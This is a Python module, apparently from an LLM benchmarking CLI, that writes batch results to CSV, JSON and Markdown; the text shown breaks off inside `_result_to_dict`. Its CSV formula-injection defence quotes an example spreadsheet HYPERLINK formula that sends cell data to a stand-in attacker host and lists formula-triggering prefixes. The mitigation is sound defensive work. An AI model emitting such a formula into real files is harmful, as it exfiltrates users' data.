"""Output writers for batch mode: CSV, JSON, Markdown.

All writers are atomic: they write to `<path>.tmp` and `os.replace` into
place. A SIGINT during write leaves the original file (or no file) intact
rather than a half-written one.

`BatchResult` is the unified data shape - built from a `StreamState` plus
its source `BatchPrompt`. The CSV column order is the spec'd canonical
order and tests pin it explicitly.
"""

from __future__ import annotations

import csv
import io
import json
import os
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any

from rich.console import Console
from rich.markdown import Markdown

from cli_modelarium import __version__
from cli_modelarium.assertions import (
    ERROR_MARK,
    FAIL_MARK,
    PASS_MARK,
    AssertionResult,
    count_assertion_totals,
    count_errored,
    count_passed,
    failed_types,
)
from cli_modelarium.batch import BatchPrompt
from cli_modelarium.judging import JudgeResult
from cli_modelarium.pricing import PRICING_AS_OF, is_local_model
from cli_modelarium.streaming import StreamState, index_distinct_prompts

# The four terminal states a row can be in, in precedence order. ONE definition,
# because four surfaces render it - the CSV `status` column, the Markdown Status
# column, the compare console table and the runs table - and three of them used
# to carry their own copy. `cli._status_text_for` was a fourth, wired to nothing.
#
# CLOSED SET. Unlike `stop_category`, which is the provider's own label and is
# documented below as open, these four values are chosen by this tool and a
# consumer may branch on them. Adding a fifth is a schema change.
STATUS_OK = "ok"
STATUS_REFUSED = "refused"
STATUS_ERROR = "error"
STATUS_CANCELLED = "cancelled"
STATUS_VALUES: tuple[str, ...] = (STATUS_OK, STATUS_REFUSED, STATUS_ERROR, STATUS_CANCELLED)


def status_word(error: object, refused: bool, cancelled: bool) -> str:
    """The terminal state of one row, in precedence order.

    Takes the three fields rather than a row object so the console can call it
    with a `StreamState` (which carries `status`) and the formatters with a
    `BatchResult` (which carries `cancelled`), without either growing a shim.

    `error` first: a call that failed reports the failure, whatever else was set
    on the way. `cancelled` last of the three: it is the only one that means the
    provider was never reached.
    """
    if error is not None:
        return STATUS_ERROR
    if refused:
        return STATUS_REFUSED
    if cancelled:
        return STATUS_CANCELLED
    return STATUS_OK


# Canonical CSV column order. Pinned by tests so downstream pipelines can
# rely on this layout. Judge and assertion columns are appended at the end
# so existing integrations that ignore unknown columns keep working.
CSV_COLUMNS: tuple[str, ...] = (
    "prompt_id",
    "prompt",
    "system",
    "model",
    "temperature",
    "latency_ms",
    "ttft_ms",
    "input_tokens",
    "output_tokens",
    "cached_tokens",
    "cost_usd",
    "output",
    "error",
    "retries",
    "judge_score_avg",
    "judge_score_std",
    "judge_count",
    "hallucination_risk",
    "assertions_passed",
    "assertions_total",
    "assertions_failed_types",
    # v0.1.9. A refused row carries stop_reason="refusal" with an empty
    # `output` and an empty `error` - the two columns that tell it apart from
    # a model that simply answered with nothing. `stop_category` is the
    # provider's own label for the refusal and is an OPEN set: render it,
    # never branch on it.
    "stop_reason",
    "stop_category",
    # APPENDED, never inserted. The four below moved no existing column: the
    # first 23 positions are byte-identical to v0.1.9. Inserting `provider`
    # after `model` - the natural spot - would have moved 19 of them, and a
    # positional reader does not crash on that, it silently reads the provider
    # name as the temperature and `cached_tokens` as the cost.
    #
    # The route the call was made through, not the model's vendor. The same
    # weights are priced differently per route - `openai/gpt-oss-120b` is
    # 0.15/0.60 on groq and free on openrouter - so a vendor here would make
    # the price in its own row uninterpretable. Sourced from
    # `StreamState.provider_name`, which is registry data set at state-build
    # time; NOT from a format-time lookup, which raises on a retired or removed
    # model, and NOT from `CompletionResult.provider`, which is blank on every
    # error and cancelled row.
    "provider",
    # The row's terminal state, from the CLOSED set in STATUS_VALUES. Branch on
    # this, not on `stop_reason`: that is the provider's own text. CSV could
    # not express `cancelled` at all before this - a cancelled row differed
    # from an ok row in exactly one cell, an empty `cost_usd`, which is the
    # inference-by-absence the JSON side of this file rejects at :695.
    "status",
    # Every assertion the row configured, and the subset that could not run.
    # `assertions_total` is deliberately NOT widened to cover them: it is the
    # denominator of `pass_rate`, and redefining it would break
    # `assertions_passed / assertions_total` for anyone checking it. A refused
    # row used to render `0,0,""` - byte-identical to a row with no assertions
    # at all - so a pipeline summing the two columns reported a clean 100%.
    "assertions_configured",
    "assertions_errored",
)


@dataclass
class BatchResult:
    """A single batch row - the union of a StreamState and a BatchPrompt,
    optionally enriched with judge scores and assertion results.
    """

    prompt_id: str
    prompt: str
    system: str | None
    model: str
    temperature: float
    latency_ms: float | None
    ttft_ms: float | None
    input_tokens: int
    output_tokens: int
    cached_tokens: int
    cost_usd: float
    output: str
    error: str | None
    retries: int
    # The provider declined - see CompletionResult. `error` stays None on a
    # refused row, which is what keeps its cost in every total here.
    refused: bool = False
    # Stopped by the cost ceiling. Distinct from `error` and `refused`: the call
    # did not fail and was not declined - it was never allowed to finish. Its
    # `cost_usd` is not trustworthy, which is why it serialises as null.
    cancelled: bool = False
    stop_reason: str | None = None
    stop_category: str | None = None
    # The raw assertion configs from the user's input file. Always preserved
    # so JSON round-trips the user's intent even when assertions were skipped.
    assertions_raw: list[dict[str, Any]] = field(default_factory=list)
    # None when judging wasn't requested for this batch.
    judge_result: JudgeResult | None = None
    # None when assertion execution was skipped
    # (--no-assertions, or failed main call); empty list when the prompt
    # simply had no assertions configured.
    assertion_results: list[AssertionResult] | None = None
    # v0.1.1: 0 for single-run/batch flows (the default); 0..N-1 for the
    # compare command's --runs N flag. Only emitted in CSV/JSON/Markdown
    # when the surrounding `runs` parameter > 1.
    run_index: int = 0
    # The route the call went through, carried on the row rather than looked up
    # at format time. Defaulted rather than required: as a required field it
    # breaks 101 tests, 94 of them TypeError noise from the dataclass
    # signature; defaulted it breaks only the CSV column-count pins.
    provider: str = ""


def state_to_result(
    state: StreamState,
    bp: BatchPrompt,
    judge_result: JudgeResult | None = None,
    assertion_results: list[AssertionResult] | None = None,
) -> BatchResult:
    """Convert a StreamState + its source BatchPrompt (and optional Judge/Assertion
    results) into a BatchResult.
    """
    return BatchResult(
        prompt_id=bp.id,
        prompt=bp.prompt,
        system=state.system_prompt,
        model=state.model,
        temperature=state.temperature,
        latency_ms=state.latency_ms,
        ttft_ms=state.ttft_ms,
        input_tokens=state.input_tokens,
        output_tokens=state.output_tokens,
        cached_tokens=state.cached_tokens,
        cost_usd=state.cost_usd,
        output=state.text,
        error=state.error,
        retries=state.attempts,
        refused=state.refused,
        cancelled=state.status == "cancelled",
        stop_reason=state.stop_reason,
        stop_category=state.stop_category,
        assertions_raw=list(bp.assertions),
        judge_result=judge_result,
        assertion_results=assertion_results,
        run_index=state.run_index,
        provider=state.provider_name,
    )


def _judge_cell_avg(r: BatchResult) -> Any:
    """Render the judge_score_avg field for tabular output. Empty if no judging."""
    if r.judge_result is None or r.judge_result.average_score is None:
        return ""
    return round(r.judge_result.average_score, 2)


def _judge_cell_std(r: BatchResult) -> Any:
    if r.judge_result is None or r.judge_result.std_dev is None:
        return ""
    return round(r.judge_result.std_dev, 3)


def _judge_count(r: BatchResult) -> int:
    if r.judge_result is None:
        return 0
    return sum(1 for j in r.judge_result.judges if j.score is not None)


def _hallucination_risk_cell(r: BatchResult) -> str:
    """Render the hallucination_risk column for tabular output. Empty when not in
    hallucination mode (i.e., no judge had a risk_level).
    """
    if r.judge_result is None:
        return ""
    if r.judge_result.aggregated_risk_level is None:
        return ""
    return r.judge_result.aggregated_risk_level


def _assertion_passed_cell(r: BatchResult) -> Any:
    """Render assertions_passed for tabular output. Empty when assertions not run."""
    if r.assertion_results is None:
        return ""
    passed, _ = count_passed(r.assertion_results)
    return passed


def _assertion_total_cell(r: BatchResult) -> Any:
    """Render assertions_total. Empty when not run.

    Uses count_passed's denominator (excludes 'error' rows) so the
    pass/total ratio is interpretable.
    """
    if r.assertion_results is None:
        return ""
    _, total = count_passed(r.assertion_results)
    return total


def _assertion_configured_cell(r: BatchResult) -> Any:
    """Every assertion the row configured, definitive plus errored.

    Empty when assertions were not run at all, which is what tells a refused
    row (`0` passed of `0` definitive, `4` configured) apart from a row that
    simply had none (`""` everywhere).
    """
    if r.assertion_results is None:
        return ""
    return len(r.assertion_results)


def _assertion_errored_cell(r: BatchResult) -> Any:
    """The subset that could not run - a refusal, a bad regex, a missing
    library. `assertions_total` excludes these by design; this is where they
    are counted instead of vanishing."""
    if r.assertion_results is None:
        return ""
    return count_errored(r.assertion_results)


def _assertion_failed_types_cell(r: BatchResult) -> str:
    """Semicolon-separated list of failed assertion types for CI grep."""
    if r.assertion_results is None:
        return ""
    return ";".join(failed_types(r.assertion_results))


# ===== CSV =====


def _format_csv(
    results: list[BatchResult],
    runs: int = 1,
    stats_by_cell_cis: dict | None = None,
) -> str:
    """Build the full CSV text. Output field newlines are escaped to literal \\n
    so cells don't break spreadsheet imports.

    When `runs > 1` an additional `run_index` column is appended to every
    row. When `runs == 1` (the default) the column set is byte-identical
    to v0.1.0.

    v0.1.3: when `stats_by_cell_cis` is provided, additional CI columns
    are appended to each row matching the row's model. When CIs are
    absent (None), the column set is byte-identical to v0.1.2.
    """
    fieldnames = list(CSV_COLUMNS)
    if runs > 1:
        fieldnames.append("run_index")

    ci_metrics: list[str] = []
    if stats_by_cell_cis:
        # Determine which metric CIs are present across all models
        # (deterministic order: latency_ms, output_tokens, cost_usd, score).
        present: set[str] = set()
        for metrics in stats_by_cell_cis.values():
            present.update(metrics.keys())
        for m in ("latency_ms", "output_tokens", "cost_usd", "score"):
            if m in present:
                ci_metrics.append(m)
                fieldnames.append(f"{m}_ci_low")
                fieldnames.append(f"{m}_ci_high")
        # PROVENANCE, appended after the pairs so the pairs keep their order.
        # `_flatten_cell_cis` carries eight fields per interval and CSV wrote
        # two of them: every row of a cost-ceiling run carried the same bounds
        # with nothing saying they rested on the five cells that ran. The
        # per-metric sample count varies (mode-only judging gives `score` one
        # observation per cell where `latency_ms` gets N), so it is per metric;
        # method, level, resamples and seed are one bootstrap configuration for
        # the whole run, so they are a shared block rather than 4x4 columns.
        for m in ci_metrics:
            fieldnames.append(f"{m}_ci_n")
        fieldnames.extend(("ci_method", "ci_level", "ci_resamples", "ci_seed"))

    buf = io.StringIO(newline="")
    writer = csv.DictWriter(buf, fieldnames=fieldnames, extrasaction="ignore")
    writer.writeheader()
    for r in results:
        row = {
            "prompt_id": r.prompt_id,
            "prompt": _csv_escape(r.prompt),
            "system": _csv_escape(r.system or ""),
            "model": r.model,
            "temperature": r.temperature,
            "latency_ms": _none_or(r.latency_ms),
            "ttft_ms": _none_or(r.ttft_ms),
            "input_tokens": r.input_tokens,
            "output_tokens": r.output_tokens,
            "cached_tokens": r.cached_tokens,
            "cost_usd": "" if r.cancelled else r.cost_usd,
            "output": _csv_escape(r.output),
            "error": _csv_escape(r.error or ""),
            "retries": r.retries,
            "judge_score_avg": _judge_cell_avg(r),
            "judge_score_std": _judge_cell_std(r),
            "judge_count": _judge_count(r),
            "hallucination_risk": _hallucination_risk_cell(r),
            "assertions_passed": _assertion_passed_cell(r),
            "assertions_total": _assertion_total_cell(r),
            "assertions_failed_types": _assertion_failed_types_cell(r),
            "stop_reason": r.stop_reason or "",
            "stop_category": r.stop_category or "",
            "provider": r.provider,
            "status": status_word(r.error, r.refused, r.cancelled),
            "assertions_configured": _assertion_configured_cell(r),
            "assertions_errored": _assertion_errored_cell(r),
        }
        if runs > 1:
            row["run_index"] = r.run_index
        if ci_metrics and stats_by_cell_cis:
            # Keyed by cell, not model. A row belongs to exactly one
            # cell, so it carries that cell's interval; looking up by
            # `r.model` alone would miss and blank every CI column.
            model_cis = stats_by_cell_cis.get(
                (r.model, r.temperature, r.system), {}
            )
            for m in ci_metrics:
                ci = model_cis.get(m)
                row[f"{m}_ci_low"] = _none_or(ci["ci_low"]) if ci else ""
                row[f"{m}_ci_high"] = _none_or(ci["ci_high"]) if ci else ""
                row[f"{m}_ci_n"] = _none_or(ci.get("n_samples")) if ci else ""
            # One configuration per run, so any interval on the row carries it.
            # Read from this row's own cell rather than from the first cell in
            # the file: a row whose cell produced no interval must report
            # nothing, not another cell's settings.
            provenance = next((c for c in (model_cis.get(m) for m in ci_metrics) if c), None)
            row["ci_method"] = (provenance.get("method") or "") if provenance else ""
            row["ci_level"] = _none_or(provenance.get("ci_level")) if provenance else ""
            row["ci_resamples"] = _none_or(provenance.get("n_resamples")) if provenance else ""
            row["ci_seed"] = _none_or(provenance.get("seed")) if provenance else ""
        # Defuse formulas at the write boundary, once, rather than at each
        # field assignment above: `prompt_id` and `model` have never had an
        # escaping helper, and a column added later would not get one either.
        # Deliberately here and not upstream - the same values feed JSON and
        # Markdown, which need no formula defence and must not gain the prefix.
        writer.writerow({key: _defuse_formula(value) for key, value in row.items()})
    return buf.getvalue()


def write_csv(
    results: list[BatchResult],
    output_path: Path,
    runs: int = 1,
    stats_by_cell_cis: dict | None = None,
) -> None:
    """Atomic write of `results` to `output_path` as CSV."""
    atomic_write_bytes(
        output_path,
        _format_csv(results, runs=runs, stats_by_cell_cis=stats_by_cell_cis).encode(
            "utf-8"
        ),
    )


def _csv_escape(text: str) -> str:
    """Escape newlines in a cell so the CSV stays one row per record."""
    if not text:
        return ""
    return text.replace("\r\n", "\\n").replace("\n", "\\n").replace("\r", "\\r")


# The characters OWASP lists as formula-initiating. Tab and the two newlines
# are on the list because some importers strip leading whitespace before
# deciding whether a cell is a formula.
FORMULA_PREFIXES: tuple[str, ...] = ("=", "+", "-", "@", "\t", "\r", "\n")


def _defuse_formula(value: Any) -> Any:
    """Prefix a cell that a spreadsheet would otherwise evaluate as a formula.

    A model response of `=HYPERLINK("http://evil.example/?d="&A2,"Click")` is
    valid CSV and a live exfiltration link the moment the file is opened in
    Excel, Google Sheets or LibreOffice. The leading apostrophe is OWASP's
    recommended mitigation: spreadsheets read it as "the rest of this cell is
    text" rather than as data. The value is preserved, not stripped - a
    consumer recovers the original by removing one leading `'`.

    Known limit, from OWASP's own page: none of the standard mitigations
    survives Microsoft Excel saving and re-opening the file, because Excel may
    drop the quoting on the way out. That makes this incomplete, not useless -
    it defends the common case of opening a freshly written file. Do not remove
    it on discovering the limitation.

    Applies to `str` values only. Every numeric column holds a float or an int
    when it has a value and `''` when it does not, so type is a sufficient
    guard and a column added later is covered without being enumerated.
    """
    if isinstance(value, str) and value.startswith(FORMULA_PREFIXES):
        return "'" + value
    return value


def _none_or(value: float | None) -> Any:
    """Render None as the empty string in CSV (vs the literal 'None')."""
    return "" if value is None else value


# ===== JSON =====


def _format_json(
    results: list[BatchResult],
    runs: int = 1,
    significance_results: list | None = None,
    stats_by_cell_cis: dict | None = None,
    mcnemar_results: list | None = None,
    methodology: dict | None = None,
    models_without_temperature: list[str] | None = None,
    significance_temperature_mixed: bool = False,
    run_identity: dict | None = None,
) -> str:
    """Build the JSON payload string with metadata header + results array.

    When judging is enabled (any result has a judge_result), include
    `judge_cost_usd` and `total_cost_usd_with_judges`. When assertions ran
    (any result has assertion_results), include `total_assertions`,
    `total_assertions_configured`, `total_assertions_passed`, `pass_rate`.

    **`total_assertions` counts the DEFINITIVE assertions - those that produced
    a verdict** - not every assertion in the suite. It is the denominator of
    `pass_rate`, so `total_assertions_passed / total_assertions == pass_rate`
    exactly, and that identity is why the field is not redefined: a suite where
    eight of sixteen assertions errored publishes `total_assertions: 8`.
    `total_assertions_configured` is the whole number, definitive plus errored.

    When `runs > 1`, one additive field appears: the top-level `stats_by_cell`
    array, one entry per cell. It stays gated because it is a real aggregate
    that does not exist at a single run, and `total_runs` says why it is
    missing. `run_index` used to be gated with it and no longer is - see
    `_result_to_dict`.

    THE "byte-identical to v0.1.0 at runs == 1" PROPERTY IS GONE, and was
    already gone before run identity landed: 0.2.0 made `total_runs` and
    `methodology` unconditional, so a single-run compare payload has carried
    two post-v0.1.0 keys since that release. The rule that survives is the
    useful half - no key is ever REMOVED, and a consumer reading by name is
    unaffected.

    EXCEPTIONS, from 0.1.5: top-level `models_without_temperature` (a list) and
    top-level `significance_temperature_mixed` (a bool) are ALWAYS present,
    unconditionally - the list even when empty, the bool even when False. Every
    other additive key here is kept conditional to preserve byte-identical
    output; these two are deliberately not, because a consumer must be able to
    read them directly rather than treat absence as "no models were affected"
    or "the samples were comparable" - either of which would be
    indistinguishable from an older version that never emitted the key.

    When `significance_results` is provided and non-empty, a
    `significance_tests` array is added. When it's None/empty, no new
    key appears - so output stays byte-identical for callers who don't
    use significance.
    """
    total_cost = sum(r.cost_usd for r in results if r.error is None)
    judge_cost = sum(
        j.cost_usd for r in results if r.judge_result is not None for j in r.judge_result.judges
    )
    has_judges = any(r.judge_result is not None for r in results)
    has_assertions = any(r.assertion_results is not None for r in results)

    payload: dict[str, Any] = {
        "version": __version__,
        "pricing_as_of": PRICING_AS_OF,
        "total_cost_usd": total_cost,
        "total_results": len(results),
        "failed_results": sum(1 for r in results if r.error),
        "models_without_temperature": list(models_without_temperature or []),
        "significance_temperature_mixed": bool(significance_temperature_mixed),
        "results": [_result_to_dict(r) for r in results],
    }
    # RUN IDENTITY, unconditional when supplied, on the same argument that made
    # `models_without_temperature` unconditional in 0.1.5: a consumer must be
    # able to READ the value rather than infer it from absence. A conditional
    # `run_id` is a `run_id` nothing can rely on, and there is no fallback -
    # latency cannot order two runs (the faster one ran second in the probe
    # that prompted this) and mtime does not survive `git add`. It is built by
    # the CLI, never here: `_format_json` is entered after the last provider
    # call returns, so a timestamp taken here would be a finish time.
    #
    # COPIED AS A UNIT, not field by field. `build_run_identity` is the only
    # producer and returns all four together, so the per-field `in` check this
    # replaced could fire only on a hand-built dict - and would then emit a
    # PARTIAL identity block. A payload carrying `run_id` but no `invocation`
    # is the half-answer a consumer cannot act on: it can tell two runs apart
    # and still not tell `compare` from `batch`. Indexing raises instead, which
    # is the loud failure a private formatter should have.
    if run_identity:
        for field in ("started_at", "run_id", "experiment_key", "invocation"):
            payload[field] = run_identity[field]
    # ALWAYS PRESENT, `0` on a run where nothing was declined. `failed_results`
    # counts `r.error`, and a refusal carries `error is None`, so declines fall
    # out of both terms - the same gap the Markdown report header had, from the
    # same computation in this file.
    #
    # It was emitted only when non-zero, to keep a clean run's payload
    # byte-identical to 0.1.9. That is a property this release had already
    # given up - see the docstring above, and `total_runs` below - so the gate
    # was defending nothing while making `0` and "a tool too old to count
    # declines" the same observation. Read the VALUE.
    payload["refused_results"] = sum(
        1 for r in results if r.error is None and r.refused and not r.cancelled
    )
    # The cost ceiling's rows, unconditional for the same reason: `failed_results`
    # counts `r.error` and a cancelled row has none, so it was inside
    # `total_results` and outside every named term.
    payload["cancelled_results"] = sum(1 for r in results if r.error is None and r.cancelled)
    # ALWAYS PRESENT, `1` on the single-run path. It used to appear only when
    # `runs > 1`, so `"total_runs" not in payload` was a working test for "this
    # was a single run" - and a consumer that wrote it got a different answer
    # from one reading `stats_by_cell`, which is still gated. Read the VALUE.
    payload["total_runs"] = runs
    if runs > 1:
        payload["stats_by_cell"] = _build_stats_by_cell(
            results, stats_by_cell_cis=stats_by_cell_cis
        )
    if has_judges:
        payload["judge_cost_usd"] = judge_cost
        payload["total_cost_usd_with_judges"] = total_cost + judge_cost
    if has_assertions:
        totals = count_assertion_totals(r.assertion_results for r in results)
        payload["total_assertions"] = totals.definitive
        payload["total_assertions_passed"] = totals.passed
        # Always present whenever the block fires, 0 on the normal path: a
        # consumer must not have to read absence as "nothing errored", which
        # would be indistinguishable from a version that never emitted it.
        payload["total_assertions_errored"] = totals.errored
        # Every assertion in the suite, whether or not it produced a verdict.
        # `total_assertions` above is the DEFINITIVE count and stays that way:
        # it is the denominator of `pass_rate`, so redefining it would silently
        # break `total_assertions_passed / total_assertions == pass_rate` for
        # anyone checking it. Always present, `0`-safe, additive - the same
        # shape `total_assertions_errored` was added in.
        payload["total_assertions_configured"] = totals.definitive + totals.errored
        # The subset of `errored` a model declined. Always present whenever the
        # block fires, `0` on the normal path - the same rule as
        # `total_assertions_errored` two fields above, which it used to
        # contradict from inside the same block: one said absence must not mean
        # "nothing errored", the other made absence mean "nothing refused".
        # `pass_rate` below is still the ratio over the answered requests; this
        # is how much of the suite that ratio does not cover.
        payload["total_assertions_refused"] = totals.refused
        # null, not 1.0, when nothing was definitive. See AssertionTotals.
        payload["pass_rate"] = totals.pass_rate
    if significance_results:
        payload["significance_tests"] = [
            _significance_result_to_dict(r) for r in significance_results
        ]
    if mcnemar_results:
        payload["mcnemar_tests"] = [
            {
                "model_a": r.model_a,
                "model_b": r.model_b,
                "metric": r.metric,
                "both_pass": r.both_pass,
                "a_pass_b_fail": r.a_pass_b_fail,
                "a_fail_b_pass": r.a_fail_b_pass,
                "both_fail": r.both_fail,
                "n_discordant": r.n_discordant,
                # Runs both models produced a judged outcome for. It was computed
                # and discarded; the two rates below divide by it, and they are
                # null when it is zero rather than rendering as 0%.
                "n_paired": r.n_paired,
                "a_pass_rate": r.a_pass_rate,
                "b_pass_rate": r.b_pass_rate,
                "chi2_statistic": r.chi2_statistic,
                "p_value": r.p_value,
                "p_value_corrected": r.p_value_corrected,
                "correction_method": r.correction_method,
                # Pairs tested, not pairs formed - the same meaning this key
                # carries in the significance block above.
                "n_comparisons": r.n_comparisons,
                "n_pairs_untestable": getattr(r, "n_pairs_untestable", 0),
                "threshold": r.threshold,
                "significant_at_threshold": r.significant_at_threshold,
                "method": r.method,
            }
            for r in mcnemar_results
        ]
    if methodology is not None:
        payload["methodology"] = methodology
    return json.dumps(payload, ensure_ascii=False, indent=2)


def _significance_result_to_dict(r: Any) -> dict[str, Any]:
    """Serialize a SignificanceResult (v0.1.2 + v0.1.3 optional fields)."""
    out: dict[str, Any] = {
        "model_a": r.model_a,
        "model_b": r.model_b,
        "metric": r.metric,
        "n_a": r.n_a,
        "n_b": r.n_b,
        "mean_a": r.mean_a,
        "mean_b": r.mean_b,
        "stdev_a": r.stdev_a,
        "stdev_b": r.stdev_b,
        "test_used": r.test_used,
        "test_statistic": r.test_statistic,
        "degrees_of_freedom": r.degrees_of_freedom,
        "p_value": r.p_value,
        "p_value_corrected": r.p_value_corrected,
        "correction_method": r.correction_method,
        "n_comparisons": r.n_comparisons,
        "effect_size": r.effect_size,
        "effect_size_metric": "cohens_d",
        "effect_size_interpretation": r.effect_size_interpretation,
        "threshold": r.threshold,
        "significant_at_threshold": r.significant_at_threshold,
    }
    # Emitted only when non-zero so a run where every pair was testable keeps its
    # previous key set exactly. Read with a default: the display stubs in tests/
    # carry the fields that predate this one.
    if getattr(r, "n_pairs_untestable", 0):
        out["n_pairs_untestable"] = getattr(r, "n_pairs_untestable", 0)
    # Emitted only when an arm declined, so a payload from a run with no
    # refusals keeps its previous key set exactly.
    if getattr(r, "n_refused_a", 0) or getattr(r, "n_refused_b", 0):
        out["n_refused_a"] = getattr(r, "n_refused_a", 0)
        out["n_refused_b"] = getattr(r, "n_refused_b", 0)
    # v0.1.3 optional fields: only add when populated (preserves v0.1.2 schema
    # when CIs were not requested).
    if r.effect_size_ci_low is not None or r.effect_size_ci_high is not None:
        out["effect_size_ci_low"] = r.effect_size_ci_low
        out["effect_size_ci_high"] = r.effect_size_ci_high
        out["bootstrap_method"] = r.bootstrap_method
        out["bootstrap_resamples"] = r.bootstrap_resamples
        out["bootstrap_seed"] = r.bootstrap_seed
    return out


def write_json(
    results: list[BatchResult],
    output_path: Path,
    runs: int = 1,
    significance_results: list | None = None,
    stats_by_cell_cis: dict | None = None,
    mcnemar_results: list | None = None,
    methodology: dict | None = None,
    models_without_temperature: list[str] | None = None,
    significance_temperature_mixed: bool = False,
    run_identity: dict | None = None,
) -> None:
    """Atomic write of `results` to `output_path` as JSON."""
    atomic_write_bytes(
        output_path,
        _format_json(
            results,
            runs=runs,
            significance_results=significance_results,
            stats_by_cell_cis=stats_by_cell_cis,
            mcnemar_results=mcnemar_results,
            methodology=methodology,
            models_without_temperature=models_without_temperature,
            significance_temperature_mixed=significance_temperature_mixed,
            run_identity=run_identity,
        ).encode("utf-8"),
    )


def _build_stats_by_cell(
    results: list[BatchResult],
    stats_by_cell_cis: dict | None = None,
) -> list[dict[str, Any]]:
    """Aggregate per-cell stats for JSON output when runs > 1.

    A "cell" is the (model, temperature, system) tuple. Iteration order
    follows first-seen order in `results`, so the output is deterministic.
    """
    grouped: dict[tuple[str, float, str | None], list[BatchResult]] = {}
    insertion_order: list[tuple[str, float, str | None]] = []
    for r in results:
        key = (r.model, r.temperature, r.system)
        if key not in grouped:
            grouped[key] = []
            insertion_order.append(key)
        grouped[key].append(r)

    out: list[dict[str, Any]] = []
    for key in insertion_order:
        cell = grouped[key]
        model, temp, sp = key
        # Timing and cost are real measurements even when the model declined,
        # so a refused row belongs in them. Anything derived from the OUTPUT
        # does not: a refusal contributes an empty string, and counting it
        # makes a cell that answered nothing look perfectly consistent.
        #
        # A cancelled cell is excluded from `answered` for the same reason and
        # deliberately left in the two lines above: it is not a "fix" pending.
        # Its `latency_ms` is None - `mark_cancelled` runs before
        # `mark_started`, so the timing was never taken - and the None filter
        # already drops it. Its `cost_usd` is 0.0 joining a list that is only
        # ever summed, where adding zero changes nothing. Adding a guard there
        # would be dead code that reads like a bug fix.
        #
        # `not r.cancelled`, not `run_statistics._is_cancelled`: that helper
        # reads `state.status`, which a BatchResult does not have. It would
        # return False for every row here and silently do nothing.
        latencies = [r.latency_ms for r in cell if r.error is None and r.latency_ms is not None]
        costs = [r.cost_usd for r in cell if r.error is None]
        answered = [r for r in cell if r.error is None and not r.refused and not r.cancelled]
        token_counts = [r.output_tokens for r in answered]
        outputs = [r.output for r in answered]
        n_succeeded = len(answered)
        n_refused = sum(1 for r in cell if r.error is None and r.refused and not r.cancelled)
        n_failed = sum(1 for r in cell if r.error is not None)
        n_cancelled = sum(1 for r in cell if r.error is None and r.cancelled)

        if len(latencies) >= 2:
            stdev = _safe_stdev(latencies)
            mean = _safe_mean(latencies)
            cv = stdev / mean if mean and stdev is not None else None
        else:
            stdev = None
            cv = None

        from collections import Counter as _Counter

        counter = _Counter(outputs)
        unique = len(counter)
        if unique < n_succeeded and counter:
            mode_output, mode_count = counter.most_common(1)[0]
        else:
            mode_output, mode_count = None, 0

        cell_dict: dict[str, Any] = {
            "model": model,
            "temperature": temp,
            "system": sp,
            "n_runs": len(cell),
            "n_succeeded": n_succeeded,
            "n_refused": n_refused,
            "n_failed": n_failed,
            # Always present, 0 on the normal path: a consumer must not have to
            # read absence as "nothing was cancelled", and the four counts have
            # to add up to n_runs for the row to be checkable.
            "n_cancelled": n_cancelled,
            "latency_mean_ms": _safe_mean(latencies),
            "latency_stdev_ms": stdev,
            "latency_cv": cv,
            "output_tokens_mean": _safe_mean(token_counts) if token_counts else None,
            "cost_total_usd": sum(costs),
            "unique_outputs": unique,
            "mode_output": mode_output,
            "mode_count": mode_count,
            "output_diversity": (unique / n_succeeded) if n_succeeded else 0.0,
        }
        # v0.1.3: inject CI fields when the caller provided them. Keys are
        # additive so v0.1.2 consumers see the same shape when CIs are off.
        if stats_by_cell_cis:
            # `key` is this cell's (model, temperature, system) tuple,
            # built at the top of the loop - the same shape the CI dict
            # is keyed by, so a cell gets its own interval.
            model_cis = stats_by_cell_cis.get(key, {})
            # THE METRIC NAME, matching the CSV column. CSV and JSON named the
            # same four intervals differently, four for four -
            # `latency_ms_ci_low` against `latency_mean_ms_ci_low` - so a
            # consumer reading both had to carry a translation table.
            #
            # The JSON side moved because the CSV side is the correct one and
            # moving it would rename columns a header-name reader depends on.
            # Two of the four old prefixes named point-estimate keys that do
            # not exist in the record at all: there is a `latency_mean_ms` and
            # an `output_tokens_mean`, but no `cost_mean_usd` and no
            # `score_mean`, so `cost_mean_usd_ci_low` pointed at nothing.
            # Same order the CSV loop uses, so only the NAMES change here.
            for metric_name in ("latency_ms", "output_tokens", "cost_usd", "score"):
                ci = model_cis.get(metric_name)
                if ci is None:
                    continue
                cell_dict[f"{metric_name}_ci_low"] = ci["ci_low"]
                cell_dict[f"{metric_name}_ci_high"] = ci["ci_high"]
                cell_dict[f"{metric_name}_ci_level"] = ci["ci_level"]
                cell_dict[f"{metric_name}_ci_n"] = ci.get("n_samples")
        out.append(cell_dict)
    return out


def _safe_mean(values: list[float]) -> float | None:
    import statistics as _s

    return _s.mean(values) if values else None


def _safe_stdev(values: list[float]) -> float | None:
    import statistics as _s

    return _s.stdev(values) if len(values) >= 2 else None


def _result_to_dict(r: BatchResult) -> dict[str, Any]:
    out: dict[str, Any] = {
        "prompt_id": r.prompt_id,
        "prompt": r.prompt,
        "system": r.system,
        "model": r.model,
        # The route, not the vendor - see CSV_COLUMNS. JSON has no positional
        # contract, so it sits beside `model` where a reader expects it rather
        # than appended at the end.
        "provider": r.provider,
        "temperature": r.temperature,
        "latency_ms": r.latency_ms,
        "ttft_ms": r.ttft_ms,
        "input_tokens": r.input_tokens,
        "output_tokens": r.output_tokens,
        "cached_tokens": r.cached_tokens,
        # None rather than 0.0: the cell was stopped before its usage arrived,
        # so the cost is unknown and a zero would understate the run's total.
        "cost_usd": None if r.cancelled else r.cost_usd,
        "cancelled": r.cancelled,
        "output": r.output,
        "error": r.error,
        "retries": r.retries,
        # Always emitted, so a consumer can read them directly rather than
        # treat absence as "not refused" - which an older version's output
        # would be indistinguishable from.
        "refused": r.refused,
        "stop_reason": r.stop_reason,
        "stop_category": r.stop_category,
        "assertions": r.assertions_raw,
    }
    # ALWAYS PRESENT, `0` on the single-run path. It used to appear only when
    # `runs > 1`, so `"run_index" not in row` was a working test for "this was
    # a single run" - the same inference `total_runs` was made unconditional to
    # kill, and absence was equally indistinguishable from a version that never
    # emitted the key. Read the VALUE.
    #
    # The join key a consumer needs is `(model, temperature, system,
    # run_index)`, and it now has that shape at EVERY run count instead of two
    # shapes to branch on. What this does not do is separate two distinct CELLS
    # that share a triple: `_parse_temperatures` and `_resolve_system_prompts`
    # do not de-duplicate (only models do, at `_resolve_dynamic_groups`), so
    # `--temperatures 0,0` is two cells with one key and `run_index` reads 0 on
    # both. `prompt_id` is what tells those apart, and it is positional.
